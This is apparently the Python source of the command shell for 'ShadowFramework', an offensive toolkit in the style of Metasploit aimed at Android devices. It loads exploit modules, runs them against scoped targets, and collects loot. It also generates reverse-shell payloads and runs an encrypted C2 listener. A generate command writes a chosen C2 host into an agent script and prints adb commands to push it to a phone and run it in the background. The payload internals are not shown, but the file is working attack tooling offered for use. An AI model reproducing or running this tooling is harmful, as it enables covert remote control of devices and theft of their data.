import os
import json
import subprocess
import shlex
from pathlib import Path
from colorama import Fore, Style
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import Completer, Completion
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import FileHistory

console = Console()

class ShadowCompleter(Completer):
    def __init__(self, shell):
        self.shell = shell

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        parts = text.split()
        
        # Command completion
        if len(parts) <= 1 and not text.endswith(' '):
            word = parts[0] if parts else ''
            for cmd in self.shell.commands.keys():
                if cmd.startswith(word):
                    yield Completion(cmd, start_position=-len(word))
        
        # Scope completion for 'scopeDel'
        elif parts and parts[0].lower() == 'scopedel':
            word = parts[1] if len(parts) > 1 else ''
            scope = self.shell.db_manager.get_scope()
            for _, dev_id, nick in scope:
                if nick and nick.startswith(word):
                    yield Completion(nick, start_position=-len(word))
                if dev_id.startswith(word):
                    yield Completion(dev_id, start_position=-len(word))
        
        # Module completion for 'use'
        elif parts and parts[0].lower() == 'use':
            word = parts[1] if len(parts) > 1 else ''
            # Complete from module names
            for mod_name in self.shell.module_loader.modules.keys():
                if mod_name.startswith(word):
                    yield Completion(mod_name, start_position=-len(word))
            # Complete from search results (numerical)
            for i in range(len(self.shell.last_search_results)):
                idx_str = str(i + 1)
                if idx_str.startswith(word):
                    yield Completion(idx_str, start_position=-len(word), display_meta=self.shell.last_search_results[i])

        # Option completion for 'set'
        elif parts and parts[0].lower() == 'set' and self.shell.current_module:
            word = parts[1] if len(parts) > 1 else ''
            module = self.shell.module_loader.modules[self.shell.current_module]
            if hasattr(module, 'MODULE_INFO') and 'options' in module.MODULE_INFO:
                for option in module.MODULE_INFO['options'].keys():
                    if option.startswith(word.upper()):
                        yield Completion(option, start_position=-len(word))

class ShadowShell:
    def __init__(self, db_manager, module_loader, plugin_loader, session_manager):
        self.db_manager = db_manager
        self.module_loader = module_loader
        self.plugin_loader = plugin_loader
        self.session_manager = session_manager
        self.current_module = None
        self.options = {}
        self.running = True
        self.last_search_results = []

        self.commands = {
            'help': self.show_help,
            'exit': self.exit,
            'quit': self.exit,
            'back': self.back,
            'use': self.use_module,
            'search': self.search_modules,
            'devices': self.list_devices,
            'sessions': self.list_sessions,
            'history': self.show_history,
            'clear': self.clear_screen,
            'sh': self.local_shell,
            'options': self.show_options,
            'show': self.show_options,
            'set': self.set_option,
            'info': self.show_info,
            'run': self.run_module,
            'exploit': self.run_module,
            'scopeAdd': self.scope_add,
            'scopeDel': self.scope_del,
            'scopeList': self.scope_list,
            'scopeClear': self.scope_clear,
            'scopeRefresh': self.scope_refresh,
            'discover': self.discover_devices,
            'loot': self.show_loot,
            'report': self.gen_report,
            'payload': self.gen_payload,
            'export': self.export_data,
            'listener': self.c2_listener,
            'agents': self.c2_agents,
            'interact': self.c2_interact,
            'generate': self.c2_generate,
            'kill': self.c2_kill,
        }

        self.c2 = None  # C2 server instance

        history_path = os.path.join(os.path.expanduser("~"), ".shadow_history")
        self.session = PromptSession(
            completer=ShadowCompleter(self),
            auto_suggest=AutoSuggestFromHistory(),
            history=FileHistory(history_path)
        )

    def _get_prompt(self):
        if self.current_module:
            module_type = self.current_module.split('/')[0]
            color = "yellow" if module_type == 'auxiliary' else "blue" if module_type == 'exploit' else "green" if module_type == 'post' else "white"
            return HTML(f'<{color}>shadow({self.current_module})></{color}> ')
        
        return HTML('<ansimagenta>┌──(</ansimagenta><ansiblue>🎃🎃🎃🎃🎃</ansiblue><ansigreen>)-[SHADOW]</ansigreen>\n<ansimagenta>└─></ansimagenta> ')

    def start(self):
        console.print(f"\n[bold green]  ⚡ ShadowFramework ready — {len(self.commands)} commands loaded.[/bold green]")
        console.print(f"[dim]  Type 'help' for usage. Type 'exit' to quit.\n[/dim]")

        while self.running:
            try:
                try:
                    cmd_line = self.session.prompt(self._get_prompt())
                except (EOFError, OSError):
                    # Fallback: prompt_toolkit can't get a TTY
                    try:
                        if self.current_module:
                            prompt_str = f"shadow({self.current_module})> "
                        else:
                            prompt_str = "shadow> "
                        cmd_line = input(prompt_str)
                    except EOFError:
                        break

                cmd_line = cmd_line.strip()
                if not cmd_line:
                    continue

                if cmd_line.startswith('/'):
                    self.execute_local_command(cmd_line[1:])
                    continue

                # Use shlex for robust argument parsing
                try:
                    parts = shlex.split(cmd_line)
                except ValueError as e:
                    print(f"{Fore.RED}[!] Parsing error: {e}{Style.RESET_ALL}")
                    continue

                if not parts:
                    continue

                command = parts[0]
                # Case-insensitive lookup for commands
                matched_cmd = None
                for cmd_key in self.commands:
                    if cmd_key.lower() == command.lower():
                        matched_cmd = cmd_key
                        break

                if matched_cmd:
                    self.commands[matched_cmd](*parts[1:])
                else:
                    print(f"{Fore.RED}[!] Unknown command: {command}{Style.RESET_ALL}")

            except KeyboardInterrupt:
                continue
            except EOFError:
                break
            except Exception as e:
                console.print_exception()

    def use_module(self, *args):
        if not args:
            print(f"{Fore.RED}[!] Usage: use <module_name|index>{Style.RESET_ALL}")
            return

        target = args[0]
        module_name = None

        if target.isdigit():
            idx = int(target) - 1
            if 0 <= idx < len(self.last_search_results):
                module_name = self.last_search_results[idx]
            else:
                print(f"{Fore.RED}[!] Invalid index: {target}{Style.RESET_ALL}")
                return
        else:
            module_name = target

        if module_name in self.module_loader.modules:
            self.current_module = module_name
            self.options = {}
            # Initialize default options if any
            module_class = self.module_loader.modules[self.current_module]
            if hasattr(module_class, 'MODULE_INFO') and 'options' in module_class.MODULE_INFO:
                # We could set defaults here if the module info had them
                pass
            console.print(f"[green][+] Loaded module: {module_name}[/green]")
        else:
            console.print(f"[red][!] Module not found: {module_name}[/red]")

    def search_modules(self, *args):
        if not args:
            print(f"{Fore.RED}[!] Usage: search <term>{Style.RESET_ALL}")
            return

        term = args[0].lower()
        self.last_search_results = []

        table = Table(title=f"Search Results for '{term}'")
        table.add_column("#", style="cyan", justify="right")
        table.add_column("Module", style="green")
        table.add_column("Description", style="white")

        # Search core modules
        for name, module in self.module_loader.modules.items():
            desc = module.MODULE_INFO.get('description', '')
            if term in name.lower() or term in desc.lower():
                self.last_search_results.append(name)
                table.add_row(str(len(self.last_search_results)), name, desc)

        # Search plugins
        for name, module in self.plugin_loader.plugins.items():
            desc = module.MODULE_INFO.get('description', '')
            if term in name.lower() or term in desc.lower():
                self.last_search_results.append(name)
                table.add_row(str(len(self.last_search_results)), name, desc)

        if self.last_search_results:
            console.print(table)
        else:
            print(f"{Fore.YELLOW}[!] No modules found for: {term}{Style.RESET_ALL}")

    def show_options(self, *args):
        if not self.current_module:
            print(f"{Fore.RED}[!] No module loaded.{Style.RESET_ALL}")
            return

        module_class = self.module_loader.modules[self.current_module]
        if hasattr(module_class, 'MODULE_INFO') and 'options' in module_class.MODULE_INFO:
            table = Table(title=f"Options for {self.current_module}")
            table.add_column("Name", style="cyan")
            table.add_column("Current Setting", style="white")
            table.add_column("Required", style="yellow")
            table.add_column("Description", style="white")
            
            for option, info in module_class.MODULE_INFO['options'].items():
                value = self.options.get(option, '')
                # simplistic check for required/description if they were dicts, 
                # but currently they are strings in the example
                desc = info
                required = "yes" # default to yes if it's just a string info
                table.add_row(option, str(value), required, desc)
            
            console.print(table)
        else:
            console.print(f"[yellow][!] No options defined for this module.[/yellow]")

    def set_option(self, *args):
        if not self.current_module:
            print(f"{Fore.RED}[!] No module loaded.{Style.RESET_ALL}")
            return

        if len(args) < 2:
            print(f"{Fore.RED}[!] Usage: set <option> <value>{Style.RESET_ALL}")
            return

        option = args[0].upper()
        # Join the rest of args if multiple words (though shlex already handles quotes)
        value = " ".join(args[1:]) if len(args) > 2 else args[1]

        module_class = self.module_loader.modules[self.current_module]
        if hasattr(module_class, 'MODULE_INFO') and 'options' in module_class.MODULE_INFO:
            if option in module_class.MODULE_INFO['options']:
                self.options[option] = value
                console.print(f"[green]{option} => {value}[/green]")
            else:
                console.print(f"[red][!] Invalid option: {option}[/red]")
        else:
            console.print(f"[yellow][!] No options defined for this module.[/yellow]")

    def show_info(self, *args):
        if not self.current_module:
            print(f"{Fore.RED}[!] No module loaded.{Style.RESET_ALL}")
            return

        module_class = self.module_loader.modules[self.current_module]
        if hasattr(module_class, 'MODULE_INFO'):
            info = module_class.MODULE_INFO
            panel_content = f"Name: {info['name']}\nDescription: {info['description']}"
            console.print(Panel(panel_content, title="Module Information"))
        else:
            print(f"{Fore.YELLOW}[!] No information available for this module.{Style.RESET_ALL}")

    def _parse_scope_targets(self, target_str):
        """Parse ${number}, ${nickname}, ${[range]}, ${ALL} into a list of device IDs."""
        if not target_str.startswith("${") or not target_str.endswith("}"):
            return [target_str]

        inner = target_str[2:-1].strip()
        scope_data = self.db_manager.get_scope() # [(id, dev_id, nick), ...]
        
        if inner.upper() == "ALL":
            return [d[1] for d in scope_data]

        resolved = []
        # Handle nicknames first
        for d_id, dev_id, nick in scope_data:
            if nick and nick == inner:
                return [dev_id]

        # Handle indices and ranges: 1, 3, [5-10], 12
        parts = inner.split(',')
        for part in parts:
            part = part.strip()
            if part.startswith('[') and part.endswith(']'):
                # Range like [1-5]
                r_inner = part[1:-1]
                if '-' in r_inner:
                    try:
                        start, end = map(int, r_inner.split('-'))
                        for i in range(start, end + 1):
                            for d_id, dev_id, nick in scope_data:
                                if d_id == i:
                                    resolved.append(dev_id)
                    except ValueError: pass
            elif part.isdigit():
                idx = int(part)
                for d_id, dev_id, nick in scope_data:
                    if d_id == idx:
                        resolved.append(dev_id)
        
        return list(dict.fromkeys(resolved)) # Remove duplicates

    def run_module(self, *args):
        if not self.current_module:
            print(f"{Fore.RED}[!] No module loaded.{Style.RESET_ALL}")
            return

        # Check for multi-target syntax in common options: DEVICE_ID, RHOST
        targets = [None]
        target_option = None
        
        for opt in ['DEVICE_ID', 'RHOST', 'TARGET_IP']:
            if opt in self.options and self.options[opt].startswith("${"):
                target_option = opt
                targets = self._parse_scope_targets(self.options[opt])
                break

        if not targets:
            print(f"{Fore.YELLOW}[!] No targets resolved from scope expression.{Style.RESET_ALL}")
            return

        module_class = self.module_loader.modules[self.current_module]
        
        for t in targets:
            try:
                if target_option:
                    self.options[target_option] = t
                    console.print(f"[bold cyan][*] Running against target: {t}[/bold cyan]")
                
                module_instance = module_class(self)
                if hasattr(module_instance, 'run'):
                    module_instance.run()
                else:
                    print(f"{Fore.RED}[!] Module does not have a run method.{Style.RESET_ALL}")
            except Exception as e:
                console.print_exception()

    def scope_add(self, *args):
        if not args:
            print(f"{Fore.RED}[!] Usage: scopeAdd <device_id|index> [nickname]{Style.RESET_ALL}")
            return
        
        # Check limit
        current_scope = self.db_manager.get_scope()
        if len(current_scope) >= 20:
            console.print("[red][!] Scope limit reached (max 20 devices).[/red]")
            return

        target = args[0]
        nickname = args[1] if len(args) > 1 else None
        
        device_id = target
        # If target is index from 'devices' list
        if target.isdigit():
            devices = self.session_manager.get_devices()
            idx = int(target) - 1
            if 0 <= idx < len(devices):
                device_id = devices[idx]

        assigned = self.db_manager.add_to_scope(device_id, nickname)
        if assigned:
            console.print(f"[green][+] Added to scope: {device_id} → [bold cyan]{assigned}[/bold cyan][/green]")
        else:
            console.print(f"[red][!] Failed to add to scope.[/red]")

    def scope_del(self, *args):
        if not args:
            print(f"{Fore.RED}[!] Usage: scopeDel <id|nickname>{Style.RESET_ALL}")
            return
        
        if self.db_manager.remove_from_scope(args[0]):
            console.print(f"[green][+] Removed from scope: {args[0]}[/green]")
        else:
            console.print(f"[red][!] Not found in scope: {args[0]}[/red]")

    def scope_list(self, *args):
        scope = self.db_manager.get_scope()
        if not scope:
            console.print("[yellow][!] Scope is empty.[/yellow]")
            return

        table = Table(title="Device Scope")
        table.add_column("ID", style="cyan")
        table.add_column("Device ID / IP", style="white")
        table.add_column("Nickname", style="green")

        for d_id, dev_id, nick in scope:
            table.add_row(str(d_id), dev_id, nick or "N/A")
        
        console.print(table)

    def scope_clear(self, *args):
        self.db_manager.clear_scope()
        console.print("[green][+] Scope cleared.[/green]")

    def scope_refresh(self, *args):
        scope = self.db_manager.get_scope()
        if not scope: return

        console.print("[cyan][*] Refreshing scope connectivity...[/cyan]")
        present_devices = self.session_manager.get_devices()
        
        table = Table(title="Scope Status")
        table.add_column("Nickname", style="green")
        table.add_column("Device ID", style="white")
        table.add_column("Status", style="bold")

        for _, dev_id, nick in scope:
            status = "[green]ONLINE[/green]" if dev_id in present_devices else "[red]OFFLINE[/red]"
            table.add_row(nick or "N/A", dev_id, status)
        
        console.print(table)

    def discover_devices(self, *args):
        """Quick-launch the Android device discovery scanner."""
        mod_name = 'auxiliary/android/device_discovery'
        if mod_name in self.module_loader.modules:
            prev_module = self.current_module
            prev_opts = self.options.copy()
            self.current_module = mod_name
            self.options = {}
            if args:
                self.options['MODE'] = args[0].upper()
            self.run_module()
            self.current_module = prev_module
            self.options = prev_opts
        else:
            console.print(f"[red][!] Module '{mod_name}' not loaded. Use 'use {mod_name}' manually.[/red]")

    # ─── C2 Commands ──────────────────────────────────────────────────────
    def c2_listener(self, *args):
        """Start or stop the C2 listener."""
        from utils.c2_server import C2Server
        if args and args[0].lower() == 'stop':
            if self.c2:
                self.c2.stop()
                self.c2 = None
                console.print("[yellow][*] C2 listener stopped.[/yellow]")
            else:
                console.print("[yellow][!] No listener running.[/yellow]")
            return

        port = int(args[0]) if args and args[0].isdigit() else 4443
        key = args[1] if len(args) > 1 else 'shadow_default_key'

        if self.c2:
            console.print(f"[yellow][!] Listener already running on :{self.c2.port}. Use 'listener stop' first.[/yellow]")
            return

        self.c2 = C2Server(port=port, crypto_key=key)
        actual_port = self.c2.start()
        console.print(f"[bold green][+] C2 listener started on 0.0.0.0:{actual_port} (TLS + AES-256)[/bold green]")
        console.print(f"[dim]  Key: {key}[/dim]")

    def c2_agents(self, *args):
        """List active agent sessions."""
        if not self.c2:
            console.print("[yellow][!] No C2 listener running. Use 'listener <port>' first.[/yellow]")
            return
        self.c2.list_sessions()

    def c2_interact(self, *args):
        """Interact with an agent session."""
        if not self.c2:
            console.print("[yellow][!] No C2 listener running.[/yellow]")
            return
        if not args:
            console.print("[red][!] Usage: interact <session_id>[/red]")
            return
        try:
            self.c2.interact(int(args[0]))
        except ValueError:
            console.print("[red][!] Session ID must be a number.[/red]")

    def c2_generate(self, *args):
        """Generate an agent payload for deployment."""
        if not args:
            console.print("[red][!] Usage: generate <c2_host> [port] [key][/red]")
            return

        host = args[0]
        port = args[1] if len(args) > 1 else '4443'
        key = args[2] if len(args) > 2 else 'shadow_default_key'

        import shutil
        src = Path('payloads/shadow_agent.py')
        if not src.exists():
            console.print("[red][!] Agent template not found at payloads/shadow_agent.py[/red]")
            return

        out_dir = Path('loot/agents')
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f'agent_{host.replace(".", "_")}_{port}.py'
        shutil.copy2(src, out_file)

        # Patch the config values into the generated agent
        content = out_file.read_text()
        content = content.replace("C2_HOST = os.getenv('SHADOW_C2_HOST', '127.0.0.1')",
                                  f"C2_HOST = os.getenv('SHADOW_C2_HOST', '{host}')")
        content = content.replace("C2_PORT = int(os.getenv('SHADOW_C2_PORT', '4443'))",
                                  f"C2_PORT = int(os.getenv('SHADOW_C2_PORT', '{port}'))")
        content = content.replace("CRYPTO_KEY = os.getenv('SHADOW_KEY', 'default_shadow_key')",
                                  f"CRYPTO_KEY = os.getenv('SHADOW_KEY', '{key}')")
        out_file.write_text(content)

        console.print(f"[bold green][+] Agent payload generated: {out_file}[/bold green]")
        console.print(f"[dim]  Deploy: adb push {out_file} /data/local/tmp/agent.py[/dim]")
        console.print(f"[dim]  Run:    adb shell nohup python3 /data/local/tmp/agent.py &[/dim]")

    def c2_kill(self, *args):
        """Kill an agent session."""
        if not self.c2:
            console.print("[yellow][!] No C2 listener running.[/yellow]")
            return
        if not args:
            console.print("[red][!] Usage: kill <session_id>[/red]")
            return
        try:
            self.c2.kill_session(int(args[0]))
        except ValueError:
            console.print("[red][!] Session ID must be a number.[/red]")

    def execute_local_command(self, cmd):
        try:
            subprocess.run(cmd, shell=True)
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def local_shell(self, *args):
        print(f"{Fore.CYAN}[*] Dropping into local shell. Type 'exit' to return.{Style.RESET_ALL}")
        while True:
            try:
                cmd = input("local> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                self.execute_local_command(cmd)
            except KeyboardInterrupt:
                print()
                break

    def show_help(self, *args):
        help_text = """
        [bold cyan]Core Commands:[/bold cyan]
        help              Show this help menu
        back              Deselect current module
        exit / quit       Exit the framework
        use <module|idx>  Load a module by name or search index
        search <term>     Search for modules
        devices           List connected devices
        sessions          List active sessions
        history           Show command history
        clear             Clear the screen
        sh                Drop into a local shell
        /<command>        Execute a command on the local machine
        
        [bold cyan]Module Commands:[/bold cyan]
        options           Display module options
        set <opt> <val>   Set a module option
        info              Show module information
        run               Execute the current module
        
        [bold cyan]Scope Commands:[/bold cyan]
        scopeAdd <id> [n] Add device to scope
        scopeDel <id|n>   Remove from scope
        scopeList         List devices in scope
        scopeClear        Clear current scope
        scopeRefresh      Check device connectivity
        discover          Quick-launch Android device scanner
        
        [bold cyan]Data Commands:[/bold cyan]
        loot [list|clean]  Browse collected loot
        report [html|pdf]  Generate engagement report
        payload <type>     Generate shell payloads (python/bash/exe/apk)
        export [scope|loot] Export data to JSON/CSV
        
        [bold cyan]C2 Commands:[/bold cyan]
        listener <port>   Start/stop encrypted C2 listener
        agents            List connected agents
        interact <id>     Interact with an agent session
        generate <host>   Generate agent payload for deployment
        kill <id>         Kill an agent session
        """
        console.print(Panel(help_text, title="ShadowFramework Help", expand=False))

    def list_devices(self, *args):
        devices = self.session_manager.get_devices()
        if devices:
            print(f"{Fore.CYAN}[+] Connected devices:{Style.RESET_ALL}")
            for idx, device in enumerate(devices, 1):
                print(f"  #{idx}: {device}")
        else:
            print(f"{Fore.YELLOW}[!] No devices connected.{Style.RESET_ALL}")

    def list_sessions(self, *args):
        sessions = self.session_manager.get_sessions()
        if sessions:
            print(f"{Fore.CYAN}[+] Active sessions:{Style.RESET_ALL}")
            for session in sessions:
                print(f"  {session}")
        else:
            print(f"{Fore.YELLOW}[!] No active sessions.{Style.RESET_ALL}")

    def show_history(self, *args):
        # prompt_toolkit handles history via FileHistory, let's just show it
        history_path = os.path.join(os.path.expanduser("~"), ".shadow_history")
        if os.path.exists(history_path):
            with open(history_path, 'r') as f:
                for line in f.readlines():
                    print(line.strip())

    def clear_screen(self, *args):
        print("\033[H\033[J", end="")

    def back(self, *args):
        """Deselect the current module."""
        if self.current_module:
            console.print(f"[dim]Deselected {self.current_module}[/dim]")
            self.current_module = None
            self.options = {}
        else:
            console.print("[yellow][!] No module selected.[/yellow]")

    def show_loot(self, *args):
        """Browse the loot directory."""
        loot_dir = Path("loot")
        loot_dir.mkdir(exist_ok=True)

        if args and args[0].lower() == 'clean':
            import shutil
            shutil.rmtree(loot_dir, ignore_errors=True)
            loot_dir.mkdir(exist_ok=True)
            console.print("[green][+] Loot directory cleaned.[/green]")
            return

        files = list(loot_dir.rglob('*'))
        files = [f for f in files if f.is_file()]

        if not files:
            console.print("[yellow][!] No loot collected yet.[/yellow]")
            return

        table = Table(title=f"Collected Loot ({len(files)} files)")
        table.add_column("#", style="cyan")
        table.add_column("File", style="white")
        table.add_column("Size", style="green")
        table.add_column("Modified", style="dim")

        for i, f in enumerate(sorted(files), 1):
            from datetime import datetime
            size = f.stat().st_size
            if size > 1048576:
                size_str = f"{size / 1048576:.1f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.1f} KB"
            else:
                size_str = f"{size} B"
            mtime = datetime.fromtimestamp(f.stat().st_mtime).strftime('%Y-%m-%d %H:%M')
            table.add_row(str(i), str(f.relative_to(loot_dir)), size_str, mtime)

        console.print(table)

    def gen_report(self, *args):
        """Generate an engagement report."""
        from utils.report_generator import ReportGenerator
        rg = ReportGenerator()

        fmt = args[0].lower() if args else 'html'

        # Gather data
        scope = self.db_manager.get_scope()
        sections = []

        # Scope section
        if scope:
            scope_text = "\n".join(f"  {d_id}. {dev_id} ({nick or 'N/A'})" for d_id, dev_id, nick in scope)
            sections.append(("Target Scope", scope_text))

        # Loot section
        loot_dir = Path("loot")
        if loot_dir.exists():
            loot_files = list(loot_dir.rglob('*'))
            loot_files = [f for f in loot_files if f.is_file()]
            if loot_files:
                loot_text = "\n".join(f"  {f.relative_to(loot_dir)} ({f.stat().st_size} bytes)" for f in loot_files)
                sections.append(("Collected Loot", loot_text))

        # Module count
        mod_count = len(self.module_loader.modules)
        sections.append(("Framework Info", f"  Loaded modules: {mod_count}\n  Active scope: {len(scope)} devices"))

        title = "ShadowFramework Engagement Report"
        content = f"<p>Report generated from ShadowFramework session.</p>"

        if fmt == 'pdf':
            rg.generate_pdf_report(title, content, sections)
        elif fmt == 'json':
            data = {'scope': [{'id': d, 'device': dev, 'nick': n} for d, dev, n in scope],
                    'modules_loaded': mod_count}
            rg.generate_json_report(title, data)
        else:
            rg.generate_html_report(title, content, sections)

    def gen_payload(self, *args):
        """Generate a shell payload."""
        from utils.payload_generator import PayloadGenerator
        pg = PayloadGenerator()

        if not args:
            console.print("[yellow]Usage: payload <type> [lhost] [lport][/yellow]")
            console.print("  Types: python, bash, exe, dll, apk")
            console.print("  Example: payload python 10.0.0.1 4444")
            return

        ptype = args[0].lower()
        lhost = args[1] if len(args) > 1 else '127.0.0.1'
        lport = args[2] if len(args) > 2 else '4444'

        pg.generate_shell_payload(payload_type=ptype, lhost=lhost, lport=lport)

    def export_data(self, *args):
        """Export scope or loot data to JSON/CSV."""
        if not args:
            console.print("[yellow]Usage: export <scope|loot> [json|csv][/yellow]")
            return

        what = args[0].lower()
        fmt = args[1].lower() if len(args) > 1 else 'json'
        export_dir = Path("exports")
        export_dir.mkdir(exist_ok=True)

        from datetime import datetime
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')

        if what == 'scope':
            scope = self.db_manager.get_scope()
            if not scope:
                console.print("[yellow][!] Scope is empty.[/yellow]")
                return

            if fmt == 'csv':
                import csv
                out = export_dir / f"scope_{ts}.csv"
                with open(out, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['ID', 'Device', 'Nickname'])
                    for d_id, dev_id, nick in scope:
                        writer.writerow([d_id, dev_id, nick or ''])
            else:
                out = export_dir / f"scope_{ts}.json"
                data = [{'id': d, 'device': dev, 'nickname': n} for d, dev, n in scope]
                with open(out, 'w') as f:
                    json.dump(data, f, indent=2)

            console.print(f"[green][+] Scope exported to {out}[/green]")

        elif what == 'loot':
            loot_dir = Path("loot")
            files = list(loot_dir.rglob('*')) if loot_dir.exists() else []
            files = [f for f in files if f.is_file()]

            if not files:
                console.print("[yellow][!] No loot to export.[/yellow]")
                return

            if fmt == 'csv':
                import csv
                out = export_dir / f"loot_{ts}.csv"
                with open(out, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Path', 'Size', 'Modified'])
                    for lf in files:
                        mtime = datetime.fromtimestamp(lf.stat().st_mtime).isoformat()
                        writer.writerow([str(lf), lf.stat().st_size, mtime])
            else:
                out = export_dir / f"loot_{ts}.json"
                data = []
                for lf in files:
                    data.append({'path': str(lf), 'size': lf.stat().st_size,
                                 'modified': datetime.fromtimestamp(lf.stat().st_mtime).isoformat()})
                with open(out, 'w') as f:
                    json.dump(data, f, indent=2)

            console.print(f"[green][+] Loot index exported to {out}[/green]")
        else:
            console.print("[yellow]Usage: export <scope|loot> [json|csv][/yellow]")

    def exit(self, *args):
        self.running = False
